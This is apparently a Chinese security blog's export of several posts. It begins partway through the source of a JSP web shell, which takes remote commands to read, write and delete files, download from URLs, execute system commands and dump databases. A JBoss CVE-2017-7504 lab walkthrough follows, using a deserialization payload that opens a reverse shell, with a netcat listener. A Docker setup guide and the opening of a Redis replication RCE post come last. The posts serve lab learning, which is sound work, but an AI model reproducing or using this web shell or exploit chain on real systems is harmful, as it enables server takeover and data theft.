</span><br><span class="line">              df.mkdir();  </span><br><span class="line">         &#125;  </span><br><span class="line">           File z[] = sf.listFiles();  </span><br><span class="line">          for (int j = 0; j &lt; z.length; j++) &#123;  </span><br><span class="line">              HH(s + &quot;/&quot; + z[j].getName(), d + &quot;/&quot; + z[j].getName());  </span><br><span class="line">         &#125;  </span><br><span class="line">       &#125; else &#123;  </span><br><span class="line">          FileInputStream is = new FileInputStream(sf);  </span><br><span class="line">           FileOutputStream os = new FileOutputStream(df);  </span><br><span class="line">          int n;  </span><br><span class="line">          byte[] b = new byte[512];  </span><br><span class="line">           while ((n = is.read(b, 0, 512)) != -1) &#123;  </span><br><span class="line">               os.write(b, 0, n);  </span><br><span class="line">         &#125;  </span><br><span class="line">           is.close();  </span><br><span class="line">           os.close();  </span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;  </span><br><span class="line">   void II(String s, String d) throws Exception &#123;  </span><br><span class="line">       File sf = new File(s), df = new File(d);  </span><br><span class="line">      sf.renameTo(df);  </span><br><span class="line">   &#125;  </span><br><span class="line">void JJ(String s) throws Exception &#123;  </span><br><span class="line">       File f = new File(s);  </span><br><span class="line">      f.mkdir();  </span><br><span class="line">   &#125;  </span><br><span class="line"> void KK(String s, String t) throws Exception &#123;  </span><br><span class="line">      File f = new File(s);  </span><br><span class="line">    SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);  </span><br><span class="line">      java.util.Date dt = fm.parse(t);  </span><br><span class="line">   f.setLastModified(dt.getTime());  </span><br><span class="line">   &#125;  </span><br><span class="line">  void LL(String s, String d) throws Exception &#123;  </span><br><span class="line">      URL u = new URL(s);  </span><br><span class="line">      int n = 0;  </span><br><span class="line">      FileOutputStream os = new FileOutputStream(d);  </span><br><span class="line">       HttpURLConnection h = (HttpURLConnection) u.openConnection();  </span><br><span class="line">       InputStream is = h.getInputStream();  </span><br><span class="line">      byte[] b = new byte[512];  </span><br><span class="line">      while ((n = is.read(b)) != -1) &#123;  </span><br><span class="line">         os.write(b, 0, n);  </span><br><span class="line">      &#125;  </span><br><span class="line">      os.close();  </span><br><span class="line">       is.close();  </span><br><span class="line">    h.disconnect();  </span><br><span class="line">  &#125;  </span><br><span class="line">  void MM(InputStream is, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">       String l;  </span><br><span class="line">       BufferedReader br = new BufferedReader(new InputStreamReader(is));  </span><br><span class="line">      while ((l = br.readLine()) != null) &#123;  </span><br><span class="line">          sb.append(l + &quot;\r\n&quot;);  </span><br><span class="line">      &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">  void NN(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">      Connection c = GC(s);  </span><br><span class="line">      ResultSet r = s.indexOf(&quot;jdbc:oracle&quot;)!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();  </span><br><span class="line">      while (r.next()) &#123;  </span><br><span class="line">           sb.append(r.getString(1) + &quot;\t|\t\r\n&quot;);  </span><br><span class="line">       &#125;  </span><br><span class="line">      r.close();  </span><br><span class="line">       c.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">  void OO(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">   Connection c = GC(s);  </span><br><span class="line">      String[] x = s.trim().split(&quot;choraheiheihei&quot;);  </span><br><span class="line">     ResultSet r = c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!=-1?x.length&gt;5?x[5]:x[4]:null, &quot;%&quot;, new String[]&#123;&quot;TABLE&quot;&#125;);  </span><br><span class="line">      while (r.next()) &#123;  </span><br><span class="line">         sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t|\t\r\n&quot;);  </span><br><span class="line">     &#125;  </span><br><span class="line">     r.close();  </span><br><span class="line">   c.close();  </span><br><span class="line"> &#125;  </span><br><span class="line">   void PP(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">      String[] x = s.trim().split(&quot;\r\n&quot;);  </span><br><span class="line">       Connection c = GC(s);  </span><br><span class="line">     Statement m = c.createStatement(1005, 1007);  </span><br><span class="line">      ResultSet r = m.executeQuery(&quot;select * from &quot; + x[x.length-1]);  </span><br><span class="line">      ResultSetMetaData d = r.getMetaData();  </span><br><span class="line">      for (int i = 1; i &lt;= d.getColumnCount(); i++) &#123;  </span><br><span class="line">         sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)+ &quot;)\t&quot;);  </span><br><span class="line">   &#125;  </span><br><span class="line">      r.close();  </span><br><span class="line">    m.close();  </span><br><span class="line">       c.close();  </span><br><span class="line">   &#125;  </span><br><span class="line">  void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception &#123;  </span><br><span class="line">       Connection c = GC(s);  </span><br><span class="line">      Statement m = c.createStatement(1005, 1008);  </span><br><span class="line">     BufferedWriter bw = null;  </span><br><span class="line">      try &#123;  </span><br><span class="line">          ResultSet r = m.executeQuery(q.indexOf(&quot;--f:&quot;)!=-1?q.substring(0,q.indexOf(&quot;--f:&quot;)):q);  </span><br><span class="line">          ResultSetMetaData d = r.getMetaData();  </span><br><span class="line">           int n = d.getColumnCount();  </span><br><span class="line">         for (int i = 1; i &lt;= n; i++) &#123;  </span><br><span class="line">              sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line">          sb.append(&quot;\r\n&quot;);  </span><br><span class="line">          if(q.indexOf(&quot;--f:&quot;)!=-1)&#123;  </span><br><span class="line">             File file = new File(p);  </span><br><span class="line">               if(q.indexOf(&quot;-to:&quot;)==-1)&#123;  </span><br><span class="line">                   file.mkdir();  </span><br><span class="line">             &#125;  </span><br><span class="line">            bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!=-1?p.trim():p+q.substring(q.indexOf(&quot;--f:&quot;) + 4,q.length()).trim()),true),cs));  </span><br><span class="line">          &#125;  </span><br><span class="line">         while (r.next()) &#123;  </span><br><span class="line">              for (int i = 1; i &lt;= n; i++) &#123;  </span><br><span class="line">                  if(q.indexOf(&quot;--f:&quot;)!=-1)&#123;  </span><br><span class="line">                        bw.write(r.getObject(i)+&quot;&quot;+&quot;\t&quot;);  </span><br><span class="line">                        bw.flush();  </span><br><span class="line">                    &#125;else&#123;  </span><br><span class="line">                        sb.append(r.getObject(i)+&quot;&quot; + &quot;\t|\t&quot;);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">                if(bw!=null)&#123;bw.newLine();&#125;  </span><br><span class="line">                sb.append(&quot;\r\n&quot;);  </span><br><span class="line">            &#125;  </span><br><span class="line">            r.close();  </span><br><span class="line">            if(bw!=null)&#123;bw.close();&#125;  </span><br><span class="line">       &#125; catch (Exception e) &#123;  </span><br><span class="line">           sb.append(&quot;Result\t|\t\r\n&quot;);  </span><br><span class="line">            try &#123;  </span><br><span class="line">               m.executeUpdate(q);  </span><br><span class="line">                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);  </span><br><span class="line">           &#125; catch (Exception ee) &#123;  </span><br><span class="line">               sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">        m.close();  </span><br><span class="line">     c.close();  </span><br><span class="line">&#125;  </span><br><span class="line">%&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">//String Z = EC(request.getParameter(Pwd) + &quot;&quot;, cs);  </span><br><span class="line">   cs = request.getParameter(&quot;code&quot;) != null ? request.getParameter(&quot;code&quot;)+ &quot;&quot;:cs;  </span><br><span class="line">  request.setCharacterEncoding(cs);  </span><br><span class="line">   response.setContentType(&quot;text/html;charset=&quot; + cs);  </span><br><span class="line">  StringBuffer sb = new StringBuffer(&quot;&quot;);  </span><br><span class="line">if (request.getParameter(Pwd) != null) &#123;  </span><br><span class="line">  try &#123;  </span><br><span class="line">     String Z = EC(request.getParameter(&quot;action&quot;) + &quot;&quot;);  </span><br><span class="line">       String z1 = EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;);  </span><br><span class="line">       String z2 = EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;);  </span><br><span class="line">      sb.append(&quot;-&gt;&quot; + &quot;|&quot;);  </span><br><span class="line">      String s = request.getSession().getServletContext().getRealPath(&quot;/&quot;);  </span><br><span class="line">     if (Z.equals(&quot;A&quot;)) &#123;  </span><br><span class="line">          sb.append(s + &quot;\t&quot;);  </span><br><span class="line">           if (!s.substring(0, 1).equals(&quot;/&quot;)) &#123;  </span><br><span class="line">             AA(sb);  </span><br><span class="line">          &#125;  </span><br><span class="line">      &#125; else if (Z.equals(&quot;B&quot;)) &#123;  </span><br><span class="line">          BB(z1, sb);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;C&quot;)) &#123;  </span><br><span class="line">           String l = &quot;&quot;;  </span><br><span class="line">          BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));  </span><br><span class="line">          while ((l = br.readLine()) != null) &#123;  </span><br><span class="line">               sb.append(l + &quot;\r\n&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line">           br.close();  </span><br><span class="line">      &#125; else if (Z.equals(&quot;D&quot;)) &#123;  </span><br><span class="line">          BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));  </span><br><span class="line">          bw.write(z2);  </span><br><span class="line">          bw.close();  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;E&quot;)) &#123;  </span><br><span class="line">            EE(z1);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;F&quot;)) &#123;  </span><br><span class="line">          FF(z1, response);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;G&quot;)) &#123;  </span><br><span class="line">         GG(z1, z2);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;H&quot;)) &#123;  </span><br><span class="line">          HH(z1, z2);  </span><br><span class="line">          sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;I&quot;)) &#123;  </span><br><span class="line">          II(z1, z2);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;J&quot;)) &#123;  </span><br><span class="line">           JJ(z1);  </span><br><span class="line">         sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;K&quot;)) &#123;  </span><br><span class="line">           KK(z1, z2);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;L&quot;)) &#123;  </span><br><span class="line">           LL(z1, z2);  </span><br><span class="line">         sb.append(&quot;1&quot;);  </span><br><span class="line">    &#125; else if (Z.equals(&quot;M&quot;)) &#123;  </span><br><span class="line">           String[] c = &#123; z1.substring(2), z1.substring(0, 2), z2 &#125;;  </span><br><span class="line">           Process p = Runtime.getRuntime().exec(c);  </span><br><span class="line">         MM(p.getInputStream(), sb);  </span><br><span class="line">         MM(p.getErrorStream(), sb);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;N&quot;)) &#123;  </span><br><span class="line">          NN(z1, sb);  </span><br><span class="line">        &#125; else if (Z.equals(&quot;O&quot;)) &#123;  </span><br><span class="line">            OO(z1, sb);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;P&quot;)) &#123;  </span><br><span class="line">           PP(z1, sb);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;Q&quot;)) &#123;  </span><br><span class="line">        QQ(cs, z1, z2, sb,z2.indexOf(&quot;-to:&quot;)!=-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\\\&quot;, &quot;/&quot;)+&quot;images/&quot;);  </span><br><span class="line">     &#125;  </span><br><span class="line">    &#125; catch (Exception e) &#123;  </span><br><span class="line"> sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());  </span><br><span class="line">  &#125;  </span><br><span class="line">sb.append(&quot;|&quot; + &quot;&lt;-&quot;);  </span><br><span class="line">out.print(sb.toString());  </span><br><span class="line">&#125;  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
  <entry>
    <title>JBoss 4.x 反序列化漏洞(CVE-2017-7504)</title>
    <url>/2021/08/27/JBoss%204.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2017-7504)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>JBoss AS 4.x及之前版本</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker搭建；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/jboss/CVE-2017-7504</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境</span><br><span class="line">- 靶机：centos 7/docker CVE-2017-7504</span><br><span class="line">- 攻击机：kali 2020/CVE-2015-7501</span><br></pre></td></tr></table></figure>

<p>漏洞验证；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://XXX.XXX.XXX.XXX:8080/jbossmq-httpil/HTTPServerILServlet</span><br></pre></td></tr></table></figure>

<p>访问页面如下则可能存在有此漏洞：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827111919231.png" alt="image-20210827111919231"></p>
<p>反序列化利用工具;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/ianxtianxt/CVE-2015-7501/</span><br></pre></td></tr></table></figure>

<p>在kail攻击机中解压CVE-2015-7501，并进入目录;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip CVE-2015-7501-master.zip</span><br><span class="line">cd CVE-2015-7501-master/</span><br></pre></td></tr></table></figure>

<p>攻击机若没有Java环境，则需先安装Java环境；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz </span><br><span class="line">tar zxvf jdk-8u20-linux-x64.tar.gz</span><br><span class="line">rm -rf /usr/bin/java*</span><br><span class="line">ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<p>反序列化利用工具反弹shell;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.240.242:2333（IP是攻击机ip,2333是要监听的端口)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112227950.png" alt="image-20210827112227950"></p>
<p>攻击机中另起终端，执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>

<p>这个时候在CVE-2015-7501-master/目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件。</p>
<p>使用curl就能反弹shell，执行命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://192.168.240.140:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112436086.png" alt="image-20210827112436086"></p>
<p>若返回的shell非正常交互，则执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112510693.png" alt="image-20210827112510693"></p>
]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
  <entry>
    <title>docker安装与使用</title>
    <url>/2021/08/27/docker%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>Docker 包括三个基本概念:</p>
<ul>
<li><strong>镜像（Image）</strong>：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</li>
<li><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</li>
<li><strong>仓库（Repository）</strong>：仓库可看成一个代码控制中心，用来保存镜像。</li>
</ul>
<p>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。</p>
<hr>
<span id="more"></span>

<ul>
<li><strong>详情参考</strong>：<a href="https://www.runoob.com/docker/docker-architecture.html">https://www.runoob.com/docker/docker-architecture.html</a></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829115850233.png" alt="image-20210829115850233"></p>
<table>
<thead>
<tr>
<th align="left">概念</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Docker 镜像(Images)</td>
<td align="left">Docker 镜像是用于创建 Docker 容器的模板，比如 Ubuntu 系统。</td>
</tr>
<tr>
<td align="left">Docker 容器(Container)</td>
<td align="left">容器是独立运行的一个或一组应用，是镜像运行时的实体。</td>
</tr>
<tr>
<td align="left">Docker 客户端(Client)</td>
<td align="left">Docker 客户端通过命令行或者其他工具使用 Docker SDK (<a href="https://docs.docker.com/develop/sdk/">https://docs.docker.com/develop/sdk/</a>) 与 Docker 的守护进程通信。</td>
</tr>
<tr>
<td align="left">Docker 主机(Host)</td>
<td align="left">一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。</td>
</tr>
<tr>
<td align="left">Docker Registry</td>
<td align="left">Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。Docker Hub(<a href="https://hub.docker.com/">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <strong>&lt;仓库名&gt;:&lt;标签&gt;</strong> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <strong>latest</strong> 作为默认标签。</td>
</tr>
<tr>
<td align="left">Docker Machine</td>
<td align="left">Docker Machine是一个简化Docker安装的命令行工具，通过一个简单的命令行即可在相应的平台上安装Docker，比如VirtualBox、 Digital Ocean、Microsoft Azure。</td>
</tr>
</tbody></table>
<h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><p>Docker 要求 CentOS 系统的内核版本高于 3.10 ，使用<code>uname -r</code>来验证你的CentOS 版本是否支持 Docker ；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829111739879.png" alt="image-20210829111739879"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">使用 root 权限登录 Centos。确保 yum 包更新到最新。</span><br><span class="line">yum update -y</span><br><span class="line">卸载旧版本(如果安装过旧版本的话)</span><br><span class="line">yum remove docker  docker-common docker-selinux docker-engine</span><br><span class="line">安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">设置yum源</span><br><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829111845983.png" alt="image-20210829111845983"></p>
<p>可以查看所有仓库中所有docker版本，并选择特定版本安装;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829111944466.png" alt="image-20210829111944466"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker安装</span></span><br><span class="line">yum install docker-ce -y  <span class="comment">#由于repo中默认只开启stable仓库，故这里安装的是最新稳定版17.12.0</span></span><br><span class="line">yum install &lt;FQPN&gt;  <span class="comment"># 例如：sudo yum install docker-ce-17.12.0.ce -y</span></span><br><span class="line"><span class="comment"># 查看docker安装版本</span></span><br><span class="line">docker version</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112038280.png" alt="image-20210829112038280"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加入开机自启动</span></span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112114629.png" alt="image-20210829112114629"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装docker-compose</span></span><br><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.26.2/docker-compose-`uname -s`-`uname -m` &gt; /usr/<span class="built_in">local</span>/bin/docker-compose -k</span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h2 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h2><p><strong>查看docker镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112242182.png" alt="image-20210829112242182"></p>
<p><strong>查看所有docker容器id</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112321560.png" alt="image-20210829112321560"></p>
<p><strong>查看当前所有运行中的docker</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210830114420015.png" alt="image-20210830114420015"></p>
<p><strong>运行一个容器</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">格式：docker start &lt;id&gt;</span><br><span class="line"><span class="comment">#例如docker start 5828f5697e25</span></span><br><span class="line">1. 停止一个容器</span><br><span class="line">格式：docker stop &lt;id&gt;</span><br><span class="line"><span class="comment">#例如docker start 5828f5697e25</span></span><br><span class="line">2. 进入一个运行的容器</span><br><span class="line">格式：docker <span class="built_in">exec</span> -it  &lt;容器id&gt; /bin/bash</span><br><span class="line"><span class="comment">#例如docker exec -it  5828f5697e25 /bin/bash</span></span><br><span class="line">3. 容器端口映射</span><br><span class="line">格式：docker run &lt;容器id&gt; -it -p 5984:5984</span><br><span class="line"><span class="comment">#例如：docker run 4138cbdb4df8 -it -p 5984:5984</span></span><br></pre></td></tr></table></figure>

<h2 id="docker容器内快速更换源"><a href="#docker容器内快速更换源" class="headerlink" title="docker容器内快速更换源"></a>docker容器内快速更换源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line">    echo &quot;deb http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt; /etc/apt/sources.list</span><br><span class="line">    echo &quot;deb http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">    echo &quot;deb-src http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">    echo &quot;deb-src http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">    #更新安装源</span><br><span class="line">    apt-get update </span><br></pre></td></tr></table></figure>

<h2 id="Docker镜像命令"><a href="#Docker镜像命令" class="headerlink" title="Docker镜像命令"></a>Docker镜像命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search ubuntu	<span class="comment">#查找镜像</span></span><br><span class="line">docker pull ubuntu		<span class="comment">#拉取镜像(就是下载)</span></span><br><span class="line">docker images			<span class="comment">#查看所有Docker镜像</span></span><br><span class="line">docker <span class="built_in">history</span>			<span class="comment">#查看镜像历史（有哪些层）</span></span><br><span class="line">docker system df		<span class="comment">#查看镜像、容器、数据卷所占用的空间</span></span><br><span class="line">docker rmi -f id		<span class="comment">#删除镜像</span></span><br><span class="line">docker rmi -f `docker images -q`	<span class="comment">#删除全部镜像</span></span><br></pre></td></tr></table></figure>

<h2 id="Docker容器命令"><a href="#Docker容器命令" class="headerlink" title="Docker容器命令"></a>Docker容器命令</h2><blockquote>
<p>镜像（<code>Image</code>）和容器（<code>Container</code>）的关系，就像是面向对象程序设计中的 <code>类</code> 和 <code>实例</code> 一样</p>
</blockquote>
<blockquote>
<p>镜像是静态的定义，容器是镜像运行时的实体，容器可以被创建、启动、停止、删除、暂停等</p>
</blockquote>
<blockquote>
<p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 [命名空间]</p>
</blockquote>
<blockquote>
<p>因此容器可以拥有自己的 <code>root</code> 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间</p>
</blockquote>
<blockquote>
<p>容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps			<span class="comment">#查看所有启动的容器（若查看所有的容器包括已经关闭,添加-a参数即可）</span></span><br><span class="line">docker inspect ID	<span class="comment">#查看容器信息（数据卷等 -&gt; &quot;Mounts&quot;）</span></span><br><span class="line">docker stats ID		<span class="comment">#查看Docker状态</span></span><br><span class="line">docker logs ID		<span class="comment">#查看容器日志（报错和命令）</span></span><br><span class="line"></span><br><span class="line">docker run -it -d --name ubuntu_wintrysec -p 8088:80 ubuntu	</span><br><span class="line"><span class="comment">#运行Docker镜像</span></span><br><span class="line"><span class="comment">#-d	守护态运行，不直接把执行命令的结果输出在当前宿主机下</span></span><br><span class="line"><span class="comment">#--name参数为自定义容器名</span></span><br><span class="line"><span class="comment">#-p参数为指定端口映射、后者为容器的端口(我们访问Docker的宿主机8080端口)</span></span><br><span class="line"><span class="comment">#成功后台运行后会返回一个容器的id，只需要记住前两位即可</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it ID bash	</span><br><span class="line"><span class="comment">#进入一个正在运行的容器的shell，容器id前4位就行,或者容器名也行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>				<span class="comment">#退出容器</span></span><br><span class="line">docker stop ID		<span class="comment">#停止容器运行，写容器名也行，start是开启</span></span><br><span class="line">docker rm ID		<span class="comment">#删除容器</span></span><br><span class="line">docker rm `docker ps -a -q`		<span class="comment">#删除所有已经关闭的容器，-f能把正在运行的也关闭</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>容器安全</category>
      </categories>
  </entry>
  <entry>
    <title>Redis(&lt;= 5.0.5)主从复制 RCE</title>
    <url>/2021/08/29/Redis(=%205.0.5)%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p>在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。</p>
<ul>
<li>详情参考：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">Pavel Toporkov</a></li>
</ul>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis &lt;= 5.0.5</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="doker搭建"><a href="#doker搭建" class="headerlink" title="doker搭建"></a>doker搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">攻击机：kali</span><br><span class="line">受害机：centos-docker</span><br></pre></td></tr></table></figure>

